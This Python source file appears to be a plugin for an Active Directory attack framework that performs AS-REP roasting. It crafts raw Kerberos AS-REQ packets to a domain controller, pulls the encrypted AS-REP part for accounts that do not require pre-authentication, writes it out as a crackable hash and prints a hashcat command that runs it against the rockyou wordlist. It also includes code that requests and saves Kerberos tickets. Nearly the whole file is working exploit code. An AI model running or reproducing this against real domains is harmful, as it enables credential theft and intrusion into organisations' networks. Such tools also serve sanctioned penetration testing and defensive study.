import argparse
import datetime
import random
import socket
import struct
from binascii import hexlify
from copy import copy

from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import _enctype_table, Key
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter, KRB_ERROR, AS_REP, METHOD_DATA, \
    ETYPE_INFO2, ETYPE_INFO, PA_ENC_TS_ENC, EncryptedData, EncASRepPart
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5.types import Principal, KerberosTime
from pyasn1.codec.der import encoder, decoder
from pyasn1.error import PyAsn1Error
from pyasn1.type.univ import noValue, Sequence
from pyasn1.type.useful import GeneralizedTime
from six import b

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADAsRepRoasting(PluginAdExploitBase):
    display = "AsrepRoasting 攻击"
    alias = "as_rep"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.add_argument("-d", "--domain", help="dc fqdn (dc01.test.lab)", required=True, dest="domain")
        parser.add_argument("-u", "--username", help="username", required=True, dest="username")
        parser.add_argument("--dc-ip", help="domain ip address", required=False, dest="dc_ip")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        _domain_fqdn: str = args.domain
        _domain_name = ".".join(_domain_fqdn.split(".")[-2:])
        _dc_ip = args.dc_ip
        _username = args.username

        p = ASPaackage(_username, _dc_ip, _domain_name)
        p.send_pre_auth()

        try:
            as_rep = decoder.decode(p.raw_as_rep, asn1Spec=AS_REP())[0]
        except PyAsn1Error as e:
            if "not in asn1Spec" in str(e):
                output.info(f"{_username} not set 'don't require kerberos pre-identification' flag.")
            else:
                output.error(e)
            return result
        hashes = hexlify(as_rep['enc-part']['cipher'].asOctets()).decode()
        hash = f"$krb5asrep$23${_username}@{_domain_name}:{hashes[:32]}${hashes[32:]}"
        output.success(hash)

        with open(f"{_username}_as_rep_roasting_hash.txt", "w") as f:
            f.write(hash)

        output.info(f"saved hash to {_username}_as_rep_roasting_hash.txt")
        output.info(
            f"next use: {output.MAGENTA}hashcat -m 18200 {_username}_as_rep_roasting_hash.txt -a 3 /usr/share/wordlists/rockyou.txt")

        return result


class ASPaackage:
    # pvno kerberos 版本号
    KERB_VERSION = 5

    # 类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)
    AS_AS_REQ = int(constants.ApplicationTagNumbers.AS_REQ.value)

    # 这个是启用PAC支持的扩展。PAC(Privilege Attribute Certificate)并不在原生的kerberos里面，是微软引进的扩展。
    # 详细的内容之后将有一篇文章详细介绍PAC。PAC包含在AS_REQ 的响应body(AS_REP)。
    # 这里的value对应的是include=true或者include=false(KDC根据include的值来判断返回的票据中是否携带PAC)。
    AS_PA_PAC_REQUEST = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)

    # 这个是预认证，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过
    AS_PA_ENC_TIMESTAMP = int(constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)

    def __init__(self, username: str, ip, domain: str):
        self.raw_as_rep = None

        self._username = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value) \
            if username != "" else ""
        self._ip = ip
        self._domain_fqdn = domain.upper()
        self._domain = '.'.join(domain.split(".")[-2:]).upper()

        try:
            self._rand = random.SystemRandom()
        except NotImplementedError:
            self._rand = random

        # AS-REQ 请求包
        self._asReq = AS_REQ()
        self._asReq['pvno'] = self.KERB_VERSION
        self._asReq['msg-type'] = self.AS_AS_REQ

        # AS-REQ 子段 padata
        _pacRequest = KERB_PA_PAC_REQUEST()
        _pacRequest['include-pac'] = True
        self._encodedPacRequest = encoder.encode(_pacRequest)
        self._asReq['padata'] = noValue
        self._asReq['padata'][0] = noValue
        self._asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        self._asReq['padata'][0]['padata-value'] = self._encodedPacRequest

        # AS-REQ 子段 req-body
        self._reqBody = seq_set(self._asReq, 'req-body')
        self._reqBody['kdc-options'] = constants.encodeFlags([  # kdc-options
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.proxiable.value
        ])

        # 用户名枚举sname发起的是域名
        self._server_name = Principal('krbtgt/%s' % self._domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        seq_set(self._reqBody, 'sname', self._server_name.components_to_asn1)  # sname
        if username != "":
            seq_set(self._reqBody, 'cname', self._username.components_to_asn1)  # cname
        # 用户名枚举该值是域名，不能是域控FQDN
        self._reqBody['realm'] = self._domain  # 在协商密钥阶段不需要此值

        # 生成时间戳
        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        self._reqBody['till'] = KerberosTime.to_asn1(now)  # till
        self._reqBody['rtime'] = KerberosTime.to_asn1(now)  # rtime
        self._reqBody['nonce'] = self._rand.getrandbits(31)  # nonce

        # 加密方式，默认RC4
        self._supported_ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
        seq_set_iter(self._reqBody, 'etype', self._supported_ciphers)

    # 发送预身份认证
    def send_pre_auth(self, username=None) -> None:
        # 加密用户名
        if username is not None:
            self._username = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        seq_set(self._reqBody, 'cname', self._username.components_to_asn1)

        # 构造message信息
        message = encoder.encode(self._asReq)

        raw_as_rep = None
        try:
            raw_as_rep = self.send_receive(message, self._domain_fqdn, self._ip)
        except KerberosError as e:  # 更换加密方式
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                if self._supported_ciphers[0] in (constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
                                                  constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
                    self._supported_ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
                    seq_set_iter(self._reqBody, 'etype', self._supported_ciphers)
                    message = encoder.encode(self._asReq)
                    raw_as_rep = self.send_receive(message, self._domain_fqdn, self._ip)
                else:
                    raise
            else:
                pass
                # logs.info(f"{username} not found")
        self.raw_as_rep = raw_as_rep

    def send_package(self, password):
        preAuth = True
        # 解密，判断是否设置了"不要求 Kerberos 预身份验证"
        try:
            asRep = decoder.decode(self.raw_as_rep, asn1Spec=KRB_ERROR())[0]
        except:
            asRep = decoder.decode(self.raw_as_rep, asn1Spec=AS_REP())[0]
            preAuth = False

        encryptionTypesData = dict()
        salt = ''
        if preAuth is False:
            # In theory, we should have the right credentials for the etype specified before.
            methods = asRep['padata']
            encryptionTypesData[self._supported_ciphers[0]] = salt  # handle RC4 fallback, we don't need any salt
            # tgt = r
        else:
            methods = decoder.decode(asRep['e-data'], asn1Spec=METHOD_DATA())[0]

        # 获取加密方式，加密密码
        for method in methods:
            if method['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                etypes2 = decoder.decode(method['padata-value'], asn1Spec=ETYPE_INFO2())[0]
                for etype2 in etypes2:
                    try:
                        if etype2['salt'] is None or etype2['salt'].hasValue() is False:
                            salt = ''
                        else:
                            salt = etype2['salt'].prettyPrint()
                    except PyAsn1Error:
                        salt = ''

                    encryptionTypesData[etype2['etype']] = b(salt)
            elif method['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO.value:
                etypes = decoder.decode(method['padata-value'], asn1Spec=ETYPE_INFO())[0]
                for etype in etypes:
                    try:
                        if etype['salt'] is None or etype['salt'].hasValue() is False:
                            salt = ''
                        else:
                            salt = etype['salt'].prettyPrint()
                    except PyAsn1Error:
                        salt = ''

                    encryptionTypesData[etype['etype']] = b(salt)

        enctype = self._supported_ciphers[0]

        cipher = _enctype_table[enctype]

        # 加密密码
        key = cipher.string_to_key(password, encryptionTypesData[enctype], None)

        if enctype in encryptionTypesData is False:
            raise Exception('No Encryption Data Available!')
        new_package = ASPaackage(self._username.components[0], self._ip, self._domain_fqdn)

        # Let's build the timestamp
        timeStamp = PA_ENC_TS_ENC()

        now = datetime.datetime.utcnow()
        timeStamp['patimestamp'] = KerberosTime.to_asn1(now)
        timeStamp['pausec'] = now.microsecond

        # Encrypt the shyte
        encodedTimeStamp = encoder.encode(timeStamp)
        encriptedTimeStamp = cipher.encrypt(key, 1, encodedTimeStamp, None)

        encryptedData = EncryptedData()
        encryptedData['etype'] = cipher.enctype
        encryptedData['cipher'] = encriptedTimeStamp
        encodedEncryptedData = encoder.encode(encryptedData)

        new_package._asReq['padata'][0]['padata-type'] = self.AS_PA_ENC_TIMESTAMP
        new_package._asReq['padata'][0]['padata-value'] = encodedEncryptedData

        new_package._asReq['padata'][1] = noValue
        new_package._asReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        new_package._asReq['padata'][1]['padata-value'] = self._encodedPacRequest

        new_package._reqBody = seq_set(new_package._asReq, 'req-body')
        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        new_package._reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(new_package._reqBody, 'sname', new_package._server_name.components_to_asn1)
        seq_set(new_package._reqBody, 'cname', new_package._username.components_to_asn1)

        new_package._reqBody['realm'] = self._domain_fqdn

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        new_package._reqBody['till'] = KerberosTime.to_asn1(now)
        new_package._reqBody['rtime'] = KerberosTime.to_asn1(now)
        new_package._reqBody['nonce'] = self._rand.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(new_package._reqBody, 'etype', supportedCiphers)

        message = encoder.encode(new_package._asReq)

        # 重新发送预身份认证请求包
        self.raw_as_rep = self.send_receive(message, self._domain_fqdn, self._ip)

        encASRepPart = decoder.decode(
            cipher.decrypt(key, 3, decoder.decode(self.raw_as_rep, asn1Spec=AS_REP())[0]['enc-part']['cipher']),
            asn1Spec=EncASRepPart())[0]

        cipher = _enctype_table[encASRepPart['key']['keytype']]
        sessionKey = Key(cipher.enctype, encASRepPart['key']['keyvalue'].asOctets())

        return cipher, sessionKey

    def saveTicket(self, sessionKey):
        # output.info('Saving ticket in %s' % (self._username.components[0] + '.ccache'))
        ccache = CCache()

        ccache.fromTGT(self.raw_as_rep, sessionKey, sessionKey)
        ccache.saveFile(self._username.components[0] + '.ccache')
        output.info('Saving ticket in %s' % (self._username.components[0] + '.ccache'))

    @staticmethod
    def send_receive(data, host, kdcHost):
        if kdcHost is None:
            target_host = host
        else:
            target_host = kdcHost

        message_length = struct.pack('!i', len(data))

        output.debug('Trying to connect to KDC at %s' % target_host)
        try:
            af, sock_type, proto, canonname, sa = socket.getaddrinfo(target_host, 88, 0, socket.SOCK_STREAM)[0]
            s = socket.socket(af, sock_type, proto)
            s.connect(sa)
        except socket.error as e:
            raise socket.error("Connection error (%s:%s)" % (target_host, 88), e)

        s.sendall(message_length + data)

        recv_data_length = struct.unpack('!i', s.recv(4))[0]

        r = s.recv(recv_data_length)
        while len(r) < recv_data_length:
            r += s.recv(recv_data_length - len(r))

        try:
            krb_error = KerberosError(packet=decoder.decode(r, asn1Spec=KRB_ERROR())[0])
        except:
            return r

        if krb_error.getErrorCode() != constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
            try:
                for i in decoder.decode(r):
                    if type(i) == Sequence:
                        for k in vars(i)["_componentValues"]:
                            if type(k) == GeneralizedTime:
                                server_time = datetime.datetime.strptime(k.asOctets().decode("utf-8"), "%Y%m%d%H%M%SZ")
                                output.debug("Server time (UTC): %s" % server_time)
            except:
                # Couldn't get server time for some reason
                pass
            raise krb_error

        return r
